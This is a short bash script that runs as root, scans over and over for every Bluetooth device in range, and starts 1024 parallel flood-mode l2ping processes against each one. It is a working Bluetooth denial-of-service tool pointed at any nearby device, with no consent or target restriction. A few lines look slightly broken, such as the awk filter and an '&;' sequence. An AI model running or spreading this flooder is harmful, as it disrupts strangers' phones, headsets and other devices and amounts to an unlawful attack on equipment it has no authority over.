#!/usr/bin/env bash
set -euo pipefail

if [ "$EUID" -ne 0 ]; then
    echo "You need to run as root!"
    exit 1
fi

cleanup() {
    if [ -n "$(ps -A -o comm,pmem,rss | grep l2ping)" ]; then
        killall l2ping
    fi
    printf "\n"
    read -p "Do you want to turn off bluetooth (hci0)? [Y/n] " RESP
    if [ $RESP == 'Y' ]; then
        echo "Turning bluetooth off..."
        sudo hciconfig hci0 down
        echo "Done!"
    fi
    exit 0
}

trap cleanup EXIT

echo "Turning bluetooth on (hci0)..."
sudo hciconfig hci0 up
echo "Done!"
echo ""

while [ 1 ]; do
    echo "Scanning..."
    DEVICES=$(hcitool scan | awk 'length NR>2{print $1}' 2>&1)
    echo "Done scanning..."
    echo ""

    for bd_addr in $DEVICES; do
        echo "Pinging ${bd_addr}..."
        for i in {1..1024}; do sudo l2ping -s 512 -f $bd_addr 2>&1 > /dev/null &; done
    done

    if [ -n "${DEVICES}" ]; then
        echo ""
        sleep 5
    fi
done
